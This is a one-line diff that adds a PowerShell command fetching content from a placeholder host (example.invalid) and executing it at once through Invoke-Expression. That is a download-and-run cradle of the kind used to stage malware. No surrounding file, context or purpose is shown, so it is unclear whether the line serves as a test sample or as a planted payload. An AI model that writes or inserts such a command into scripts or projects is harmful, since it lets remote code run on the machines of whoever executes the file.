@@ -1,0 +1,1 @@
+powershell -c "iex ([string]::join('', (iwr https://example.invalid/o)))"
